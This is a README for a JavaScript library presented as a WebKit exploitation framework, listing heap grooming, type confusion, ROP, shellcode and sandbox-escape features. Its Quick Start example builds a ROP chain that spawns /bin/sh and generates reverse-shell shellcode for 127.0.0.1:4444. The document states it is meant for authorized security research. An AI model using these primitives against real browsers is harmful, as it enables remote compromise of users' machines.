# HaxHelp - Advanced WebKit Exploitation Framework

A comprehensive JavaScript library designed to aid security researchers in WebKit vulnerability analysis and exploit development.

## ⚠️ Legal and Ethical Use Only

This library is intended for:
- Security research and vulnerability analysis
- Bug bounty hunting on authorized targets
- Penetration testing with proper authorization
- Educational purposes in controlled environments
- Defensive security research

**DO NOT use this library for malicious purposes or on systems you don't own or have explicit permission to test.**

## Features

### Core Utilities
- **Memory Management**: Advanced heap grooming, garbage collection control, memory corruption detection
- **Object Inspection**: Deep object analysis, property enumeration, prototype chain inspection
- **Type Confusion**: Advanced utilities for type confusion vulnerability research
- **ROP Chain Building**: Comprehensive return-oriented programming chain construction
- **Debugging**: Advanced debugging and introspection tools with crash analysis
- **Shellcode**: Shellcode generation, encoding, and payload management

### WebKit Specific
- **JIT Analysis**: JavaScript JIT compiler analysis and manipulation tools
- **Engine Internals**: WebKit/JavaScriptCore internals exploration and exploitation
- **DOM Manipulation**: Advanced DOM object manipulation and corruption techniques
- **Memory Layout**: Heap layout analysis, visualization, and controlled corruption
- **Browser Exploitation**: Browser-specific exploitation techniques and primitives

### Advanced Exploitation
- **Use-After-Free**: UAF vulnerability simulation and exploitation frameworks
- **Buffer Overflow**: Advanced buffer overflow detection and exploitation tools
- **Information Disclosure**: Memory disclosure and information leakage techniques
- **Privilege Escalation**: Browser sandbox escape and privilege escalation utilities
- **Exploit Development**: Complete exploit development and testing framework

## Installation

```html
<script src="haxhelp.js"></script>
```

## Quick Start

```javascript
// Initialize the library
const hh = new HaxHelp();

// Advanced memory manipulation
hh.memory.advancedGrooming(0x1000, 200, 'controlled');

// Object analysis with exploitation focus
const analysis = hh.inspect.deepAnalyze(targetObject, 'exploitation');

// ROP chain building with automatic gadget discovery
const ropChain = hh.rop.autoChain({
    target: 'system_call',
    args: ['/bin/sh'],
    constraints: ['no_null_bytes']
});

// Advanced shellcode generation
const shellcode = hh.shellcode.generate({
    type: 'reverse_shell',
    host: '127.0.0.1',
    port: 4444,
    encoding: 'alphanumeric'
});
```
